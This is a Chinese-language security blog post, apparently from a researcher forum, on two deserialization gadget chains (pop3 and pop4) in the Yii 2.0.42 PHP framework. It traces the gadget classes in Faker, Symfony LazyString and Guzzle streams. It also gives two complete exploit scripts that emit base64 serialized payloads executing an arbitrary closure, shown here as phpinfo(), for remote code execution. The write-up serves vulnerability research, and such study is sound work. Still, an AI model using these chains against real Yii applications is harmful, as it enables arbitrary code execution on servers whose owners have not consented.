环境搭建请看前篇，直接切入正题，由于最近比较忙，部分地方就不那么详细分析变量构造由来了，跟着exp分析一下就可以了

### pop3

[![](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-889bbc3d939dab2ba13945ce5fa3f5c065b7b7c4.png)](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-889bbc3d939dab2ba13945ce5fa3f5c065b7b7c4.png)  
起手的地方还是一样的，毕竟就只剩下这么个起手点了，下面要更换的是`__call()`魔术方法所在的类，把目光转向这里，其实和第一条大差不差，为了有一点区别还是换了一个  
`vendor\fakerphp\faker\src\Faker\UniqueGenerator.php`  
[![](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-28f950bcfec0f6b0619b86fbc1963eac5b70ea76.png)](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-28f950bcfec0f6b0619b86fbc1963eac5b70ea76.png)  
这里的`$res`利用第一条链子中用到的类是能够让返回值可控的，也就是说此处的`$res`为可控变量；第三条链的关键点在于利用`__sleep()`魔术方法，在序列化一个对象时，如果类中存在该方法会优先调用该魔术方法;全局搜索  
`vendor\symfony\string\LazyString.php`  
[![](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-9e8796f249fb7561259dec03d8fe8f1b3808ab34.png)](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-9e8796f249fb7561259dec03d8fe8f1b3808ab34.png)  
之后会调用本类中的`__toString()`魔术方法，跟进  
[![](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-6f627ec4170f0686b73a11beb0e9876898d974a0.png)](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-6f627ec4170f0686b73a11beb0e9876898d974a0.png)  
可以看到利用点在`($this->value)()`，这种形式一看就是动态调用无参函数；这里要注意点的是第一个if条件语句，我们传入的参数值肯定会是一个字符串才能够动态调用，这里只有让if判断条件不成立程序逻辑才会到达最后的利用点处  
这里还是要用到`\Opis\Clsure`方法序列化匿名函数，这里可以写一个例子  
[![](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-09e6ba00769d5ade54e4c5cf33a5cc05608919f8.png)](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-09e6ba00769d5ade54e4c5cf33a5cc05608919f8.png)  
可以看到是能够直接绕过`is_string()`函数判断的  
至于为什么会是这样师傅们可以自己研究一下子  
解决了这一步那就可以rce了  
exp

```php
<?php
/***
 * Created by joker
 * Date 2021/9/17 16:20
 ***/
namespace Codeception\Extension;
use Faker\UniqueGenerator;
class RunProcess{
    private $processes;
    public function __construct()
    {
        $this->processes = [new UniqueGenerator()];
    }
}

namespace Faker;
use Symfony\Component\String\LazyString;
use Faker\DefaultGenerator;
class UniqueGenerator{
    protected $generator;
    protected $maxRetries;
    public function __construct()
    {
        $a = new LazyString();
        $this->generator = new DefaultGenerator($a);
        $this->maxRetries = 2;

    }
}
namespace Faker;
class DefaultGenerator{
    protected $default;
    public function __construct($default = null)
    {
        $this->default = $default;
    }
}

namespace Symfony\Component\String;
use Codeception\Extension\RunProcess;

class LazyString{
    private $value;
    public function __construct()
    {
        include("../test/closure/autoload.php");
        $a = function(){phpinfo();};
        $a = \Opis\Closure\serialize($a);
        $b = unserialize($a);
        $this->value = $b;
    }
}
$a = new RunProcess();
echo base64_encode(serialize($a));

```

[![](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-a77828ccff0215034dd06dac2c87a2c3c9380122.png)](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-a77828ccff0215034dd06dac2c87a2c3c9380122.png)

### pop4

入口依然不变，只不过这次换个跳板函数，转向`__toString()`魔术方法，php基本就是这两种做跳板  
[![](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-29cd76c73ffa7ca47063e3362a92635248f3b9a5.png)](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-29cd76c73ffa7ca47063e3362a92635248f3b9a5.png)  
这里进行了字符串的拼接，只需要让`$process`为类对象就可以触发类中的`__toString()`方法，这里这个`getCommandLine()`方法没有，所以还是需要用到第一条链中的`__call()`方法来让返回值可控，全局搜索  
`vendor\guzzlehttp\psr7\src\AppendStream.php`  
[![](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-ff3ce02b174e1303bbbe068d7611dcf7608ec773.png)](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-ff3ce02b174e1303bbbe068d7611dcf7608ec773.png)  
跟进`rewind（）`方法  
[![](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-c8cc354332dff807bbe6080868985cfff98193c1.png)](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-c8cc354332dff807bbe6080868985cfff98193c1.png)  
[![](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-02182a1be63705e60c6ab52ba50cc636304c8074.png)](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-02182a1be63705e60c6ab52ba50cc636304c8074.png)  
`$this->seekable`默认值为true，`$whence`默认值为`SEEK_SET`，所以程序会顺利向下，`$this->streams`变量可控，程序会走到断点处，这里调用了其它类中的`rewind()`方法，追踪发现是一个接口类，找到继承了该接口类的子类  
`basic\vendor\guzzlehttp\psr7\src\CachingStream.php`  
[![](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-0fc1f77fca0f4d5dc8af46be4a76436927b288ba.png)](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-0fc1f77fca0f4d5dc8af46be4a76436927b288ba.png)  
[![](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-a7768243003e1744790efc65d014c84f1bf5baab.png)](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-a7768243003e1744790efc65d014c84f1bf5baab.png)  
这里要让while条件成立才会往下，查看类中`eof()`方法  
[![](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-66874146283b26cd50bf20a7e72349665ced5568.png)](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-66874146283b26cd50bf20a7e72349665ced5568.png)  
只需要让`$this->remoteStream`的值为false，返回值就会为false，在while中的部分会回取反为true,`$diff`的取值看exp就知道来源了  
跟进`read()`方法  
[![](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-f1a2a3937915ee948986e02bf8439b22d4131cf9.png)](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-f1a2a3937915ee948986e02bf8439b22d4131cf9.png)  
`$this->stream`可控，到这里`read()`方法还是会指向接口类，所以需要找到新的继承类保证利用链能够走下去，这也就是为什么要让`$this->stream`为`PumpStream`类对象  
`vendor\guzzlehttp\psr7\src\PumpStream.php`  
[![](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-16e2b57d325fbf3e39c65d19c137d3cf782cad4d.png)](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-16e2b57d325fbf3e39c65d19c137d3cf782cad4d.png)  
跟进`pump`方法  
[![](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-404768abdb68dc65abbfdff7a29aed87a2ee2629.png)](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-404768abdb68dc65abbfdff7a29aed87a2ee2629.png)  
熟悉的地方，`$this->source`可控，只需要让传递过来的`$length`可控就可以了  
部分参数的取值可以跟着exp分析一下，就不多说了

```php
<?php
/***
 * Created by joker
 * Date 2021/9/19 18:01
 ***/
namespace Codeception\Extension;
use Faker\DefaultGenerator;
use GuzzleHttp\Psr7\AppendStream;
class  RunProcess{
    protected $output;
    private $processes = [];
    public function __construct(){
        $this->processes[]=new DefaultGenerator(new AppendStream());
        $this->output=new DefaultGenerator('joker');
    }
}
namespace Faker;
class DefaultGenerator
{
    protected $default;

    public function __construct($default = null)
    {
        $this->default = $default;
    }
}

namespace GuzzleHttp\Psr7;
use Codeception\Extension\RunProcess;
use Faker\DefaultGenerator;
final class AppendStream{
    private $streams = [];
    private $seekable = true;
    public function __construct(){
        $this->streams[]=new CachingStream();
    }
}
final class CachingStream{
    private $remoteStream;
    public function __construct(){
        $this->remoteStream=new DefaultGenerator(false);
        $this->stream=new  PumpStream();
    }
}
final class PumpStream{
    private $source;
    private $size=-10;
    private $buffer;
    public function __construct(){
        $this->buffer=new DefaultGenerator('j');
        include("../test/closure/autoload.php");
        $a = function(){phpinfo();};
        $a = \Opis\Closure\serialize($a);
        $b = unserialize($a);
        $this->source=$b;
    }
}
$a = new RunProcess();
echo base64_encode(serialize($a));
```

### 总结

yii2.0.42的反序列化就到这里了，还是靠耐心吧，加上对魔术方法的利用，这几条链都离不开那个可控返回值的类，修复的话2.0.43已经做的差不多了。